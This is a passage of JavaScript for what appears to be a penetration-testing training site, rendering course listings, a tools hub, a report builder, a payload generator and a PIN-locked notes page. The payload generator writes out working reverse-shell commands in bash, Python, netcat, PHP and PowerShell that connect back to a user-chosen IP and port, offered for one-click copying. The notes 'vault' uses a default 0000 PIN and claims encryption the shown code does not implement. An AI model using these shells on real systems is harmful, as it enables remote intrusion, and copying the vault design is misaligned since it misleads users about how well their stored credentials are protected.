            { title: 'DNS Attacks', desc: 'DNS spoofing and hijacking', time: '45 min', points: 160, difficulty: 'Hard' }
        ]
    });
}

function pageTopicForensics() {
    return createTopicPage({
        title: 'Digital Forensics',
        subtitle: 'Investigate digital crime scenes',
        icon: 'fa-microscope',
        color: '#a855f7',
        rooms: [
            { title: 'File Forensics', desc: 'Analyze file metadata and recover deleted files', time: '50 min', points: 140, difficulty: 'Medium' },
            { title: 'Memory Forensics', desc: 'Extract evidence from RAM dumps', time: '60 min', points: 200, difficulty: 'Hard' },
            { title: 'Disk Imaging', desc: 'Create and analyze disk images', time: '45 min', points: 120, difficulty: 'Easy' },
            { title: 'Log Analysis', desc: 'Find evidence in system logs', time: '40 min', points: 130, difficulty: 'Medium' },
            { title: 'Network Forensics', desc: 'Analyze pcap files for evidence', time: '55 min', points: 180, difficulty: 'Medium' },
            { title: 'Malware Analysis', desc: 'Safely analyze malicious samples', time: '70 min', points: 250, difficulty: 'Hard' }
        ]
    });
}

function pageTopicScripting() {
    return createTopicPage({
        title: 'Scripting & Automation',
        subtitle: 'Automate your security workflow',
        icon: 'fa-code',
        color: '#22c55e',
        rooms: [
            { title: 'Bash Scripting', desc: 'Automate Linux tasks', time: '60 min', points: 120, difficulty: 'Easy' },
            { title: 'Python for Security', desc: 'Write security tools in Python', time: '90 min', points: 180, difficulty: 'Medium' },
            { title: 'PowerShell Security', desc: 'Windows automation and attacks', time: '50 min', points: 150, difficulty: 'Medium' },
            { title: 'Web Scraping', desc: 'Extract data from websites', time: '40 min', points: 100, difficulty: 'Easy' },
            { title: 'API Hacking', desc: 'Test and exploit APIs', time: '55 min', points: 160, difficulty: 'Medium' },
            { title: 'Custom Exploits', desc: 'Write your own exploits', time: '80 min', points: 250, difficulty: 'Hard' }
        ]
    });
}

function pageTopicLinux() {
    return createTopicPage({
        title: 'Linux Fundamentals',
        subtitle: 'Master the command line',
        icon: 'fab fa-linux',
        color: '#f59e0b',
        rooms: [
            { title: 'Linux Basics', desc: 'Navigation, files, and permissions', time: '45 min', points: 80, difficulty: 'Easy' },
            { title: 'User Management', desc: 'Users, groups, and sudo', time: '40 min', points: 100, difficulty: 'Easy' },
            { title: 'File Permissions', desc: 'chmod, chown, and SUID', time: '35 min', points: 90, difficulty: 'Easy' },
            { title: 'Process Management', desc: 'ps, top, and cron jobs', time: '40 min', points: 110, difficulty: 'Medium' },
            { title: 'Networking Commands', desc: 'netstat, ss, curl, wget', time: '45 min', points: 120, difficulty: 'Medium' },
            { title: 'Linux Privesc', desc: 'Escalate to root access', time: '60 min', points: 200, difficulty: 'Hard' }
        ]
    });
}

// ==================== TOOLS HUB PAGE ====================
function pageToolsHub() {
    const tools = [
        { title: 'Security Cheatsheets', desc: 'Comprehensive reference for commands, payloads, and syntax', icon: 'fa-scroll', color: '#22c55e', action: "loadPage('cheatsheets')" },
        { title: 'Payload Generator', desc: 'Generate reverse shells, exploits, and malicious payloads', icon: 'fa-bomb', color: '#ef4444', action: "loadPage('payloads')" },
        { title: 'Report Builder', desc: 'Create professional pentest reports with templates', icon: 'fa-file-contract', color: '#3b82f6', action: "loadPage('report')" },
        { title: 'Encrypted Notes', desc: 'Securely store findings, credentials, and snippets', icon: 'fa-lock', color: '#f59e0b', action: "loadPage('notes')" },
        { title: 'Hash Identifier', desc: 'Identify hash types and cracking formats', icon: 'fa-fingerprint', color: '#a855f7', action: "showToast('Hash tool coming soon', 'info')" },
        { title: 'Subnet Calculator', desc: 'Calculate CIDR ranges and network masks', icon: 'fa-network-wired', color: '#06b6d4', action: "showToast('Subnet tool coming soon', 'info')" }
    ];

    return `
        <div class="tools-hub-page">
            <style>
                .tools-hub-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .tools-container { max-width: 1200px; margin: 0 auto; }
                .tools-header { text-align: center; margin-bottom: 50px; }
                .tools-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .tools-title i { color: #a855f7; margin-right: 15px; }
                .tools-subtitle { color: rgba(255,255,255,0.6); margin-top: 10px; font-size: 1.1rem; }
                .tools-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 25px; }
                .tool-card { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 30px; transition: all 0.3s; cursor: pointer; position: relative; overflow: hidden; }
                .tool-card:hover { transform: translateY(-5px); border-color: var(--tool-color); box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
                .tool-icon { width: 60px; height: 60px; background: rgba(255,255,255,0.05); border-radius: 15px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; color: var(--tool-color); margin-bottom: 20px; transition: all 0.3s; }
                .tool-card:hover .tool-icon { background: var(--tool-bg); transform: scale(1.1); }
                .tool-name { font-size: 1.4rem; font-weight: 700; color: #fff; margin-bottom: 10px; }
                .tool-desc { color: rgba(255,255,255,0.6); line-height: 1.5; font-size: 0.95rem; margin-bottom: 20px; }
                .tool-action { color: var(--tool-color); font-weight: 600; display: flex; align-items: center; gap: 8px; font-size: 0.9rem; }
                .tool-action i { transition: transform 0.3s; }
                .tool-card:hover .tool-action i { transform: translateX(5px); }
            </style>

            <div class="tools-container">
                <div class="tools-header">
                    <h1 class="tools-title"><i class="fa-solid fa-toolbox"></i> Tools Hub</h1>
                    <p class="tools-subtitle">Essential utilities for your hacking workflow</p>
                </div>

                <div class="tools-grid">
                    ${tools.map(tool => `
                        <div class="tool-card" style="--tool-color: ${tool.color}; --tool-bg: ${tool.color}20;" onclick="${tool.action}">
                            <div class="tool-icon"><i class="fa-solid ${tool.icon}"></i></div>
                            <div class="tool-name">${tool.title}</div>
                            <div class="tool-desc">${tool.desc}</div>
                            <div class="tool-action">Launch Tool <i class="fa-solid fa-arrow-right"></i></div>
                        </div>
                    `).join('')}
                </div>
            </div>
        </div>
    `;
}

// ==================== LABS HUB PAGE ====================
function pageLabsHub() {
    return `
        <div class="labs-hub-page">
    <style>
        .labs-hub-page {min - height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 60px 20px; }
        .labs-container {max - width: 1000px; margin: 0 auto; }
        .labs-header {text - align: center; margin-bottom: 60px; }
        .labs-title {font - size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
        .labs-title i {color: #ef4444; margin-right: 15px; }
        .labs-subtitle {color: rgba(255,255,255,0.6); margin-top: 10px; font-size: 1.1rem; }

        .labs-grid {display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr)); gap: 30px; }
        .lab-option-card {background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; padding: 40px; text-align: center; transition: all 0.3s; cursor: pointer; position: relative; overflow: hidden; }
        .lab-option-card:hover {transform: translateY(-10px); border-color: var(--opt-color); box-shadow: 0 20px 50px rgba(0,0,0,0.3); }
        .lab-icon {width: 80px; height: 80px; background: rgba(255,255,255,0.05); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 30px; font-size: 2.5rem; color: var(--opt-color); transition: all 0.5s; }
        .lab-option-card:hover .lab-icon {background: var(--opt-bg); transform: scale(1.1) rotate(5deg); }

        .opt-title {font - size: 1.5rem; font-weight: 700; color: #fff; margin-bottom: 15px; }
        .opt-desc {color: rgba(255,255,255,0.6); line-height: 1.6; margin-bottom: 30px; }
        .opt-btn {padding: 12px 25px; border-radius: 50px; background: transparent; border: 2px solid var(--opt-color); color: var(--opt-color); font-weight: 700; transition: all 0.3s; }
        .lab-option-card:hover .opt-btn {background: var(--opt-color); color: #000; }

        .pro-badge {position: absolute; top: 20px; right: 20px; background: linear-gradient(135deg, #ef4444, #b91c1c); color: #fff; font-weight: 800; padding: 5px 12px; border-radius: 20px; font-size: 0.8rem; box-shadow: 0 4px 15px rgba(239, 68, 68, 0.3); }
    </style>

    <div class="labs-container">
        <div class="labs-header">
            <h1 class="labs-title"><i class="fa-solid fa-flask"></i> Red Team Labs</h1>
            <p class="labs-subtitle">Advanced Offensive Environments</p>
        </div>

        <div class="labs-grid">
            <!-- Free Labs -->
            <div class="lab-option-card" style="--opt-color: #22c55e; --opt-bg: rgba(34, 197, 94, 0.2);" onclick="loadPage('free-labs')">
                <div class="lab-icon"><i class="fa-solid fa-cube"></i></div>
                <div class="opt-title">Community Labs</div>
                <div class="opt-desc">Access community machines and basic challenges. Practice your skills.</div>
                <button class="opt-btn">Start Hacking</button>
            </div>

            <!-- Pro Labs -->
            <div class="lab-option-card" style="--opt-color: #ef4444; --opt-bg: rgba(239, 68, 68, 0.2);" onclick="loadPage('pro-labs')">
                <div class="pro-badge">ELITE</div>
                <div class="lab-icon"><i class="fa-solid fa-dragon"></i></div>
                <div class="opt-title">Red Team Ops</div>
                <div class="opt-desc">Simulated corporate networks, Active Directory, and C2 operations.</div>
                <button class="opt-btn">Engage Target</button>
            </div>

            <!-- Learning Paths -->
            <div class="lab-option-card" style="--opt-color: #3b82f6; --opt-bg: rgba(59, 130, 246, 0.2);" onclick="loadPage('lab-paths')">
                <div class="lab-icon"><i class="fa-solid fa-map-location-dot"></i></div>
                <div class="opt-title">Campaign Modes</div>
                <div class="opt-desc">Structured attack campaigns and mission-based learning.</div>
                <button class="opt-btn">View Campaigns</button>
            </div>
        </div>
    </div>
</div>
`;
}

// ==================== LAB PATHS PAGE ====================
function pageLabPaths() {
    return `
    < div class="lab-paths-page" >
            <style>
                .lab-paths-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 60px 20px; }
                .lp-container { max-width: 1100px; margin: 0 auto; }
                .lp-header { margin-bottom: 40px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 20px; display: flex; justify-content: space-between; align-items: center; }
                .lp-title { font-size: 2rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .lp-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 25px; }
                
                .lp-card { background: rgba(255,255,255,0.03); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; overflow: hidden; cursor: pointer; transition: all 0.3s; }
                .lp-card:hover { transform: translateY(-5px); border-color: var(--lp-color); box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
                .lp-img { height: 140px; background: linear-gradient(135deg, rgba(0,0,0,0.8), rgba(0,0,0,0.6)), url('assets/images/path-bg.jpg'); background-size: cover; display: flex; align-items: center; justify-content: center; position: relative; }
                .lp-icon { font-size: 3rem; color: var(--lp-color); z-index: 2; text-shadow: 0 0 20px rgba(0,0,0,0.5); }
                .lp-body { padding: 25px; }
                .lp-name { font-size: 1.3rem; font-weight: 700; color: #fff; margin-bottom: 10px; }
                .lp-desc { color: rgba(255,255,255,0.6); font-size: 0.9rem; margin-bottom: 20px; line-height: 1.5; }
                .lp-meta { display: flex; gap: 15px; font-size: 0.85rem; color: rgba(255,255,255,0.5); }
                .lp-meta span { display: flex; align-items: center; gap: 5px; }
                .lp-meta i { color: var(--lp-color); }
            </style>

            <div class="lp-container">
                <div class="lp-header">
                    <h1 class="lp-title">Active Campaigns</h1>
                    <button class="cyber-btn" onclick="loadPage('labs')" style="font-size:0.9rem;"><i class="fa-solid fa-arrow-left"></i> Back</button>
                </div>

                <div class="lp-grid">
                    <!-- Red Team Path -->
                    <div class="lp-card" style="--lp-color: #ef4444;" onclick="loadPage('path-red-team')">
                        <div class="lp-img">
                            <i class="fa-solid fa-user-secret lp-icon"></i>
                        </div>
                        <div class="lp-body">
                            <div class="lp-name">Red Team Operator</div>
                            <div class="lp-desc">Full spectrum adversary simulation. Breach, pivot, and persist in enterprise networks.</div>
                            <div class="lp-meta">
                                <span><i class="fa-solid fa-cube"></i> 33 Labs</span>
                                <span><i class="fa-solid fa-clock"></i> 40h</span>
                            </div>
                        </div>
                    </div>

                    <!-- Web Path -->
                    <div class="lp-card" style="--lp-color: #f59e0b;" onclick="loadPage('web-path')">
                        <div class="lp-img">
                            <i class="fa-solid fa-globe lp-icon"></i>
                        </div>
                        <div class="lp-body">
                            <div class="lp-name">Web Adversary</div>
                            <div class="lp-desc">Master modern web exploitation. SQLi, XSS, SSRF, and advanced deserialization attacks.</div>
                            <div class="lp-meta">
                                <span><i class="fa-solid fa-cube"></i> 45 Labs</span>
                                <span><i class="fa-solid fa-clock"></i> 55h</span>
                            </div>
                        </div>
                    </div>

                     <!-- Active Directory -->
                    <div class="lp-card" style="--lp-color: #a855f7;" onclick="loadPage('ad-path')">
                        <div class="lp-img">
                            <i class="fa-solid fa-network-wired lp-icon"></i>
                        </div>
                        <div class="lp-body">
                            <div class="lp-name">Active Directory</div>
                            <div class="lp-desc">Compromise forests, Kerberos attacks, and domain dominance.</div>
                            <div class="lp-meta">
                                <span><i class="fa-solid fa-cube"></i> 12 Labs</span>
                                <span><i class="fa-solid fa-clock"></i> 20h</span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div >
    `;
}

// ==================== REPORT PAGE (Builder + Guide) ====================
function pageReport() {
    // Helper to generate the old guide content
    const getGuideContent = () => `
    < div class="report-guide-content" >
        <div class="row g-4">
            <div class="col-md-6">
                <div class="guide-card">
                    <h5><i class="fa-solid fa-camera"></i> Evidence Collection</h5>
                    <ul>
                        <li>Take high-quality screenshots showing the vulnerability</li>
                        <li>Include the full URL in the valid frame</li>
                        <li>Save full Request/Response pairs</li>
                        <li>Copy cURL commands for reproduction</li>
                    </ul>
                </div>
            </div>
            <div class="col-md-6">
                <div class="guide-card">
                    <h5><i class="fa-solid fa-pen"></i> Writing Structure</h5>
                    <ul>
                        <li><strong>Summary:</strong> Brief, high-level overview for executives.</li>
                        <li><strong>Description:</strong> Technical details of the flaw.</li>
                        <li><strong>Steps:</strong> Exact reproduction steps (1, 2, 3...).</li>
                        <li><strong>Impact:</strong> What can an attacker actually do?</li>
                    </ul>
                </div>
            </div>
        </div>
        </div >
    `;

    return `
    < div class="report-page" >
            <style>
                .report-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .report-container { max-width: 1000px; margin: 0 auto; }
                .report-header { text-align: center; margin-bottom: 40px; }
                .report-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .report-title i { color: #3b82f6; margin-right: 15px; }
                
                .report-tabs { display: flex; gap: 10px; margin-bottom: 30px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 15px; }
                .report-tab { background: transparent; border: none; color: rgba(255,255,255,0.6); padding: 10px 20px; cursor: pointer; font-size: 1rem; font-weight: 600; border-radius: 8px; transition: all 0.3s; }
                .report-tab.active { background: rgba(59, 130, 246, 0.2); color: #3b82f6; }
                .report-tab:hover:not(.active) { color: #fff; background: rgba(255,255,255,0.05); }

                .tab-content { display: none; }
                .tab-content.active { display: block; animation: fadeIn 0.4s ease; }

                /* Builder Styles */
                .builder-form { background: rgba(255,255,255,0.05); padding: 30px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.1); }
                .form-group { margin-bottom: 20px; }
                .form-label { display: block; color: #fff; margin-bottom: 8px; font-weight: 600; }
                .form-control { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 8px; color: #fff; font-family: 'JetBrains Mono', monospace; }
                .form-control:focus { outline: none; border-color: #3b82f6; }
                .btn-generate { background: linear-gradient(135deg, #3b82f6, #2563eb); color: #fff; padding: 15px 30px; border: none; border-radius: 12px; font-weight: 700; cursor: pointer; width: 100%; transition: all 0.3s; }
                .btn-generate:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(59, 130, 246, 0.3); }

                /* Guide Styles */
                .guide-card { background: rgba(255,255,255,0.05); padding: 25px; border-radius: 12px; height: 100%; border: 1px solid rgba(255,255,255,0.05); }
                .guide-card h5 { color: #3b82f6; margin-bottom: 15px; font-size: 1.2rem; display: flex; align-items: center; gap: 10px; }
                .guide-card ul { padding-left: 20px; color: rgba(255,255,255,0.7); line-height: 1.6; }
                .guide-card li { margin-bottom: 10px; }

                .preview-box { background: #1e1e1e; padding: 20px; border-radius: 8px; margin-top: 20px; font-family: monospace; white-space: pre-wrap; color: #d4d4d4; display: none; border: 1px solid #333; }
            </style>

            <div class="report-container">
                <div class="report-header">
                    <h1 class="report-title"><i class="fa-solid fa-file-contract"></i> Report Center</h1>
                    <p style="color: rgba(255,255,255,0.6);">Generate professional vulnerability reports or learn best practices</p>
                </div>

                <div class="report-tabs">
                    <button class="report-tab active" onclick="switchReportTab('builder')"><i class="fa-solid fa-wrench me-2"></i> Report Builder</button>
                    <button class="report-tab" onclick="switchReportTab('guide')"><i class="fa-solid fa-book-open me-2"></i> Writing Guide</button>
                </div>

                <!-- Builder Tab -->
                <div id="tab-builder" class="tab-content active">
                    <div class="builder-form">
                        <div class="row">
                            <div class="col-md-8">
                                <div class="form-group">
                                    <label class="form-label">Vulnerability Title</label>
                                    <input type="text" class="form-control" id="rep-title" placeholder="e.g. Stored XSS on Profile Page">
                                </div>
                            </div>
                            <div class="col-md-4">
                                <div class="form-group">
                                    <label class="form-label">Severity</label>
                                    <select class="form-control" id="rep-severity">
                                        <option value="Critical">Critical</option>
                                        <option value="High">High</option>
                                        <option value="Medium">Medium</option>
                                        <option value="Low">Low</option>
                                        <option value="Info">Info</option>
                                    </select>
                                </div>
                            </div>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Description</label>
                            <textarea class="form-control" id="rep-desc" rows="4" placeholder="Explain the vulnerability..."></textarea>
                        </div>
                        <div class="form-group">
                            <label class="form-label">Steps via Reproduction</label>
                            <textarea class="form-control" id="rep-steps" rows="4" placeholder="1. Navigate to...&#10;2. Inject payload..."></textarea>
                        </div>
                         <div class="form-group">
                            <label class="form-label">Impact</label>
                            <textarea class="form-control" id="rep-impact" rows="2" placeholder="What can an attacker achieve?"></textarea>
                        </div>
                        <button class="btn-generate" onclick="generateReportMD()"><i class="fa-solid fa-download me-2"></i> Generate Markdown Report</button>
                        <div id="rep-preview" class="preview-box"></div>
                    </div>
                </div>

                <!-- Guide Tab -->
                <div id="tab-guide" class="tab-content">
                    ${getGuideContent()}
                </div>
            </div>
        </div >
    <script>
        window.switchReportTab = function(tab) {
            document.querySelectorAll('.report-tab').forEach(t => t.classList.remove('active'));
                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));

        event.target.closest('.report-tab').classList.add('active');
        document.getElementById('tab-' + tab).classList.add('active');
            }

        window.generateReportMD = function() {
                const title = document.getElementById('rep-title').value;
        const severity = document.getElementById('rep-severity').value;
        const desc = document.getElementById('rep-desc').value;
        const steps = document.getElementById('rep-steps').value;
        const impact = document.getElementById('rep-impact').value;

        const md = \`# \${title}

        **Severity:** \${severity}

        ## Description
        \${desc}

        ## Steps to Reproduce
        \${steps}

        ## Impact
        \${impact}

        ## Remediation
        Apply input validation and output encoding.\`;

        const preview = document.getElementById('rep-preview');
        preview.textContent = md;
        preview.style.display = 'block';
        navigator.clipboard.writeText(md);
        showToast('Report copied to clipboard!', 'success');
            }
    </script>
`;
}

// ==================== PAYLOADS PAGE ====================
function pagePayloads() {
    return `
    < div class="payloads-page" >
             <style>
                .payloads-page { min-height: 100vh; background: linear-gradient(180deg, #0a0a1a 0%, #1a1a2e 100%); padding: 40px 20px; }
                .payload-container { max-width: 1000px; margin: 0 auto; }
                .payload-header { text-align: center; margin-bottom: 40px; }
                .payload-title { font-size: 2.5rem; font-weight: 800; color: #fff; font-family: 'Orbitron', sans-serif; }
                .payload-title i { color: #ef4444; margin-right: 15px; }
                
                .config-panel { background: rgba(255,255,255,0.05); padding: 25px; border-radius: 16px; margin-bottom: 30px; border: 1px solid rgba(255,255,255,0.1); }
                .config-row { display: flex; gap: 20px; flex-wrap: wrap; align-items: flex-end; }
                .config-group { flex: 1; min-width: 200px; }
                .config-label { color: #fff; font-weight: 600; margin-bottom: 8px; display: block; font-size: 0.9rem; }
                .config-input { width: 100%; padding: 12px; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.15); border-radius: 8px; color: #fff; font-family: 'JetBrains Mono', monospace; }
                .config-input:focus { border-color: #ef4444; outline: none; }
                
                .payload-card { background: rgba(30, 30, 40, 0.6); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; margin-bottom: 15px; overflow: hidden; }
                .payload-head { background: rgba(255,255,255,0.05); padding: 12px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.05); }
                .payload-name { font-weight: 700; color: #ef4444; font-size: 0.95rem; }
                .copy-btn { background: transparent; border: none; color: rgba(255,255,255,0.6); cursor: pointer; transition: color 0.2s; }
                .copy-btn:hover { color: #fff; }
                
                .payload-code { padding: 15px 20px; font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: #a5b3ce; word-break: break-all; cursor: pointer; }
                .payload-code:hover { background: rgba(255,255,255,0.02); }

                .lang-tabs { display: flex; gap: 10px; margin-bottom: 20px; }
                .lang-tab { padding: 8px 16px; border-radius: 20px; background: rgba(255,255,255,0.05); color: rgba(255,255,255,0.6); cursor: pointer; transition: all 0.3s; font-size: 0.9rem; font-weight: 600; }
                .lang-tab.active { background: #ef4444; color: #fff; }
            </style>

            <div class="payload-container">
                <div class="payload-header">
                    <h1 class="payload-title"><i class="fa-solid fa-bomb"></i> Payload Generator</h1>
                    <p style="color: rgba(255,255,255,0.6);">Generate reverse shells and command injection payloads</p>
                </div>

                <div class="config-panel">
                    <div class="config-row">
                        <div class="config-group">
                            <label class="config-label">LHOST (Your IP)</label>
                            <input type="text" class="config-input" id="lhost" value="10.10.10.10" oninput="updatePayloads()">
                        </div>
                        <div class="config-group">
                            <label class="config-label">LPORT (Your Port)</label>
                            <input type="text" class="config-input" id="lport" value="4444" oninput="updatePayloads()">
                        </div>
                        <div class="config-group" style="flex: 0 0 auto;">
                            <button class="btn btn-danger" onclick="updatePayloads()" style="padding: 12px 20px; border-radius: 8px;"><i class="fa-solid fa-refresh"></i></button>
                        </div>
                    </div>
                </div>

                <div class="lang-tabs">
                    <div class="lang-tab active" onclick="filterPayloads('all')">All</div>
                    <div class="lang-tab" onclick="filterPayloads('bash')">Bash</div>
                    <div class="lang-tab" onclick="filterPayloads('python')">Python</div>
                    <div class="lang-tab" onclick="filterPayloads('netcat')">Netcat</div>
                    <div class="lang-tab" onclick="filterPayloads('php')">PHP</div>
                    <div class="lang-tab" onclick="filterPayloads('powershell')">PowerShell</div>
                </div>

                <div id="payloads-list">
                    <!-- Payloads generated here -->
                </div>
            </div>
        </div >
    <script>
        window.updatePayloads = function() {
                const ip = document.getElementById('lhost').value || '10.10.10.10';
        const port = document.getElementById('lport').value || '4444';
        const container = document.getElementById('payloads-list');

        const payloads = [
        {name: 'Bash -i', type: 'bash', code: \`bash -i >& /dev/tcp/\${ip}/\${port} 0>&1\` },
        {name: 'Python3', type: 'python', code: \`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("\${ip}",\${port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\` },
        {name: 'Netcat Traditional', type: 'netcat', code: \`nc -e /bin/sh \${ip} \${port}\` },
        {name: 'Netcat OpenBSD', type: 'netcat', code: \`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc \${ip} \${port} >/tmp/f\` },
        {name: 'PHP Exec', type: 'php', code: \`php -r '$sock=fsockopen("\${ip}",\${port});exec("/bin/sh -i <&3 >&3 2>&3");'\` },
        {name: 'PowerShell', type: 'powershell', code: \`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('\${ip}',\${port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"\` },
        ];

        const activeTab = document.querySelector('.lang-tab.active')?.textContent.toLowerCase() || 'all';

                container.innerHTML = payloads.filter(p => activeTab === 'all' || p.type === activeTab).map(p => \`
        <div class="payload-card">
            <div class="payload-head">
                <span class="payload-name">\${p.name}</span>
                <button class="copy-btn" onclick="navigator.clipboard.writeText(this.parentElement.nextElementSibling.innerText); showToast('Copied!', 'success')"><i class="fa-solid fa-copy"></i></button>
            </div>
            <div class="payload-code" onclick="navigator.clipboard.writeText(this.innerText); showToast('Copied!', 'success')">\${p.code}</div>
        </div>
        \`).join('');
            }

        window.filterPayloads = function(type) {
            document.querySelectorAll('.lang-tab').forEach(t => t.classList.remove('active'));
        event.target.classList.add('active');
        updatePayloads();
            }

        // Init
        setTimeout(updatePayloads, 100);
    </script>
`;
}

// ==================== ENCRYPTED NOTES PAGE ====================
function pageNotes() {
    return `
    < div class="notes-page" >
            <style>
                .notes-page { min-height: 100vh; background: #0a0a0f; color: #fff; padding: 40px 20px; display: flex; flex-direction: column; align-items: center; justify-content: flex-start; }
                .notes-container { width: 100%; max-width: 800px; position: relative; z-index: 2; }
                .notes-header { text-align: center; margin-bottom: 40px; }
                .notes-title { font-family: 'Orbitron', sans-serif; font-size: 2.5rem; color: #fff; letter-spacing: 2px; }
                .notes-title i { color: #f59e0b; margin-right: 15px; }
                .notes-subtitle { color: rgba(255,255,255,0.5); font-family: 'JetBrains Mono', monospace; margin-top: 10px; }

                /* Lock Screen */
                #notes-lock-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(255,255,255,0.05); padding: 50px; border-radius: 20px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(10px); width: 100%; max-width: 500px; margin: 0 auto; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
                .lock-icon { font-size: 4rem; color: #f59e0b; margin-bottom: 20px; animation: pulse 2s infinite; }
                .pin-input { background: rgba(0,0,0,0.5); border: 2px solid rgba(255,255,255,0.1); border-radius: 12px; padding: 15px; width: 100%; font-size: 1.5rem; color: #fff; text-align: center; letter-spacing: 10px; font-family: 'JetBrains Mono', monospace; transition: all 0.3s; }
                .pin-input:focus { border-color: #f59e0b; outline: none; box-shadow: 0 0 20px rgba(245, 158, 11, 0.3); }
                .unlock-btn { margin-top: 25px; width: 100%; padding: 15px; background: linear-gradient(135deg, #f59e0b, #d97706); border: none; border-radius: 12px; color: #000; font-weight: 700; font-size: 1.1rem; cursor: pointer; transition: all 0.3s; }
                .unlock-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 20px rgba(245, 158, 11, 0.3); }

                /* Notes Editor */
                #notes-editor-ui { display: none; width: 100%; animation: fadeIn 0.5s ease; }
                .editor-toolbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; background: rgba(255,255,255,0.05); padding: 10px 20px; border-radius: 12px; border: 1px solid rgba(255,255,255,0.05); }
                .editor-status { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: #22c55e; display: flex; align-items: center; gap: 8px; }
                .action-btn { background: transparent; border: none; color: rgba(255,255,255,0.7); cursor: pointer; padding: 8px; border-radius: 8px; transition: all 0.2s; }
                .action-btn:hover { color: #fff; background: rgba(255,255,255,0.1); }
                .action-btn.save { color: #22c55e; }
                .action-btn.lock { color: #ef4444; }

                .notes-area { width: 100%; height: 60vh; background: rgba(0,0,0,0.3); border: 1px solid rgba(255,255,255,0.1); border-radius: 16px; padding: 25px; color: #d4d4d4; font-family: 'JetBrains Mono', monospace; font-size: 0.95rem; line-height: 1.6; resize: none; transition: all 0.3s; }
                .notes-area:focus { outline: none; border-color: #f59e0b; box-shadow: 0 0 20px rgba(245, 158, 11, 0.1); }
                .notes-area::placeholder { color: rgba(255,255,255,0.1); }

                @keyframes pulse { 0%, 100% { opacity: 1; transform: scale(1); } 50% { opacity: 0.7; transform: scale(0.95); } }
                @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
            </style>

            <div class="notes-container">
                <div class="notes-header">
                    <h1 class="notes-title"><i class="fa-solid fa-user-secret"></i> Encrypted Vault</h1>
                    <p class="notes-subtitle">Secure storage for your findings and credentials</p>
                </div>

                <!-- Lock Screen -->
                <div id="notes-lock-screen">
                    <i class="fa-solid fa-fingerprint lock-icon"></i>
                    <p style="margin-bottom: 20px; color: rgba(255,255,255,0.7);">Enter Access PIN</p>
                    <input type="password" id="vault-pin" class="pin-input" maxlength="4" placeholder="••••" autofocus>
                    <button class="unlock-btn" onclick="attemptUnlock()">UNLOCK VAULT</button>
                    <p class="mt-3 text-muted small" style="opacity: 0.5;">Default PIN: 0000 (First time setup)</p>
                </div>

                <!-- Editor UI -->
                <div id="notes-editor-ui">
                    <div class="editor-toolbar">
                        <div class="editor-status"><i class="fa-solid fa-shield-halved"></i> ENCRYPTED CHANNEL</div>
                        <div style="display: flex; gap: 5px;">
                            <button class="action-btn save" onclick="saveNotes()" title="Save"><i class="fa-solid fa-save"></i> Save</button>
                            <button class="action-btn" onclick="copyNotes()" title="Copy"><i class="fa-solid fa-copy"></i></button>
                            <button class="action-btn lock" onclick="lockVault()" title="Lock"><i class="fa-solid fa-lock"></i></button>
                        </div>
                    </div>
                    <textarea id="vault-content" class="notes-area" placeholder="// Enter your classified notes here..."></textarea>
                </div>
            </div>
        </div >
    `;
}

window.initNotes = function () {
    // Check if notes exist
